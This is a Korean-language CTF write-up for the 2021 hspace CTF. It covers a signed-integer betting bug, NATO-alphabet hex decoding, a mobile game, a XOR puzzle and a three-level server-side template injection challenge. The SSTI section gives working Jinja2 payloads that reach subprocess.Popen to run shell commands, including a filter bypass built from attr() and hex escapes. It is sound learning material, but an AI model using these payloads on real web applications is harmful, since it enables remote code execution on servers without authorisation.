# hspace ctf writeup

Date: Apr 24, 2021
Tags: ctf, cybersecurity

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled.png)

특이한 느낌의 사이트이다.

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%201.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%201.png)

18th place - 5736pts

## 목차

[[SYS] Gambling 1]()

[[SYS] Gambling 2]()

[[MISC] ehdna!]()

[[MOBILE] Adventure of Worrior]()

[[WEB] So Special Things]()

[[MISC] Survey]()

## [SYS] Gambling 1 (943)

```c
// gcc -o gambling gambling.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int win;

void read_flag1(){
    char buffer[100];
    FILE *fp = fopen("flag1.txt", "r");
    fgets(buffer, sizeof(buffer), fp);
    printf("%s\n", buffer);
    fclose(fp);
}

void read_flag2(){
    char buffer[100];
    FILE *fp = fopen("flag2.txt", "r");
    fgets(buffer, sizeof(buffer), fp);
    printf("%s\n", buffer);
    fclose(fp);
}

void make_random(){
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	read(fd, &win, 4);
}

int gambling1(){
	int money = 1000;
	int bat, luckynum;

	make_random();
	printf("[chall] gambling1\n");
	printf("Start Gambling!\n\n");

	while(money >= 0){
		printf("current your money : %d\n\n", money);
		printf("bat your money\n");
		printf("bat money : ");
		scanf("%d", &bat);
		printf("choose lucky number : ");
		scanf("%d", &luckynum);
		
		printf("\nlucky number is %d\n", win);
		if(luckynum == win){
			printf("You Win! ");
			printf(" + %d money\n", bat);
			money += bat;
		} else{
			printf("You Lost! ");
			printf(" - %d money\n", bat);
			money -= bat;
		}
    	make_random();

		if(money > 9999999){
			printf("You are rich!!!!\n");
			return 1;
		}
	}
	printf("You are a beggar!\n");

	return 0;

}

int gambling2(){
	int money = 1000;
	int bat, luckynum;

	make_random();
	printf("[chall] gambling2\n");
	printf("Start Gambling!\n\n");

	while(money >= 0){
		printf("current your money : %d\n\n", money);
		printf("bat your money\n");
		printf("bat money : ");
		scanf("%d", &bat);
		if(bat < 0){
			bat = bat * (-1);
		}
		if(money - bat < 0){
			bat = bat % money;
		}
		
		printf("choose lucky number : ");
		scanf("%d", &luckynum);
			
		printf("\nlucky number is %d\n", win);
		if(luckynum == win){
			printf("You Win! ");
			printf(" + %d money\n", bat);
			money += bat;
		} else{
			printf("You Lost! ");
			printf(" - %d money\n", bat);
			money -= bat;
		}
    	make_random();

		if(money > 10000){
			printf("GOOD!!!\n");
			return 1;
		}
	}
	printf("BAD!\n");
	return 0;
}

int main(){
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Hello! This is a challenge for system hacking newbies.\n");
	printf("I hope you enjoy it.\n\n");

	if(gambling1()){
		printf("\n======================================\n");
		printf("Congratulation!\n");
		read_flag1();
		printf("======================================\n\n");
	}
	else{
		return 0;
	}

	if(gambling2()){
		printf("\n======================================\n");
		printf("Congratulation!\n");
		read_flag2();
		printf("======================================\n\n");
	}

	return 0;
}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%202.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%202.png)

양수 - (음수) = 양수임을 이용해 돈을 크게 증가시킨다.

`hspace{Let's_go_up_to_100_million_Bitcoin!!}`

## [SYS] Gambling 2 (973)

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%203.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%203.png)

$2^{32}+1$ 값을 계속 넣어주면 플래그가 나온다.

`hspace{money_can_be_copied!!!}` ~~돈이 복사가 된다고!!!~~

## [MISC] ehdna! (929)

```
Four Delta Six Five Seven Three Seven Three Six One Six Seven Six Five Two Zero
Six Six Seven Two Six Foxtrot Six Delta Two Zero Six Eight Six One Six Three
Six Bravo Six Five Seven Two Two Zero Six Nine Seven Three Two Echo Two Echo
Two Echo Two Zero Six Eight Seven Three Seven Zero Six One Six Three Six Five
Seven Bravo Six Eight Six Five Six Charlie Six Charlie Six Foxtrot Five Foxtrot
Six Nine Five Foxtrot Six One Six Delta Five Foxtrot Six Echo Three Zero Three
Zero Three Zero Three Zero Three Zero Three Zero Six Two Five Foxtrot Seven
Seven Six Five Three One Six Three Six Foxtrot Six Delta Six Five Five Foxtrot
Seven Four Six Foxtrot Five Foxtrot Four Eight Seven Three Seven Zero Six One
Six Three Six Five Five Foxtrot Four Three Five Four Four Six Five Foxtrot Six
Seven Three Zero Three Zero Six Four Five Foxtrot Five Foxtrot Five Foxtrot
Five Foxtrot Six Charlie Seven Five Six Three Six Bravo Seven Echo Seven Echo
Two One Two One Seven Delta
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%204.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%204.png)

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%205.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%205.png)

nato phonetic alphbet → hex to str 하면 된다.

`hspace{hello_i_am_n000000b_we1come_to_Hspace_CTF_g00d____luck~~!!}`

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%206.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%206.png)

1번째 솔브 ✌️

## [MOBILE] Adventure of Worrior (981)

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%207.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%207.png)

apk를 실행하고 보스 피하면서 공격하다보면 플래그가 나온다. 유니티 기반으로 만들어진 게임인데 정석대로 게임 플레이를 하는 방법 외에 어떻게 플래그를 얻는 방법이 있는지 연구해야겠다.

`hspace{warrior_is_very_strong}`

## [WEB] So Special Things (991)

문제 제목의 대문자들만 보면 SST... SSTI...? 를 유추할 수 있다.

### LEVEL 1

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%208.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%208.png)

예상대로 ssti로 공격하라고 예시가 주어져있다. 

```python
{{flag()}}
```

주어진대로 flag 함수를 실행시키면...

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%209.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%209.png)

level2 로 가는 주소가 나온다.

### LEVEL 2

프로그램 상에서 존재하는 클래스들을 불러오자.

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2010.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2010.png)

여기서 디렉토리 안에 어떤 파일들이 보기 위해 `ls` 를 쓰려면 `<class 'subprocess.Popen'>` 가 몇번째 인덱스에 있는지 알아야 한다.

```python
{{''.__class__.__mro__[1].__subclasses__()[230:]}}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2011.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2011.png)

233번째 인것을 알 수 있다.

```python
{{''.__class__.__mro__[1].__subclasses__()[233]('ls', shell=True,stdout=-1).communicate()}}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2012.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2012.png)

```python
{{''.__class__.__mro__[1].__subclasses__()[233]('cat flag.txt', shell=True,stdout=-1).communicate()}}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2013.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2013.png)

level3 으로 가는 링크가 나온다.

### LEVEL 3

`ls` 를 사용하기 위해 LEVEL2에서 했던 방식 그대로 해보았지만, 필터링이 걸려있었다.

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2014.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2014.png)

알아낸 바로는 `[ ] . _ % os config request` 등이 필터링이 걸려있었다. 소괄호와 작은 따옴표가 필터링이 걸려있지 않으니 attr 함수와 ascii 인코딩을 활용하여 payload 를 만들 수 있다.

```python
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(233)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}
```

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2015.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2015.png)

위의 페이로드에 `ls` 부분에 `cat finalflag.txt` 를 넣었으나 `finalflag` 단어가 필터링 되어있다.

당황하지 않고 `cat final*` 을 해주면 된다. cat, head, tail, echo 등을 막아두었으면 훨씬 더 재밌었을 것 같다는 생각이 들었다.

```python
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(233)('cat final*',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}
```

`hspace{g00d_go0d_s3rver_S1de_Temp14te_InJection!!}`

![hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2016.png](hspace%20ctf%20writeup%20b92fabcd793445f5ba9737674e9c9e2f/Untitled%2016.png)

2번째 솔브 ✌️

## [MISC] Survey

`hspace{Thx_F0r_Enj0y_HSp43e_CTF}`

치킨 기프티콘 감사합니다!

## 느낀 점

hspace 내부 CTF 여서 그런지 서버 상태와 전반적인 대회 운영이 매우 원활했다. 실제 CTF에서 SSTI 문제를 푼건 처음이라 많은 것들을 배워가는 느낌이었다. 

네트워크 분야 `zip zip` 문제는 2개의 zip 파일을 구했지만 패스워드를 크랙하지 못해 아쉽다. ~~분명히 fcrackzip 썼는데...~~

misc 분야 baskin robbins 31 문제는 주어진 암호문을 31로 xor 하기만 하면 되는 간단한 문제였다...

```python
cp="wlo~|zd[/@j@Tq/H@g/Mb"
for i in cp:
	print(chr(ord(i)^31), end="")

# hspace{D0_u_Kn0W_x0R}
```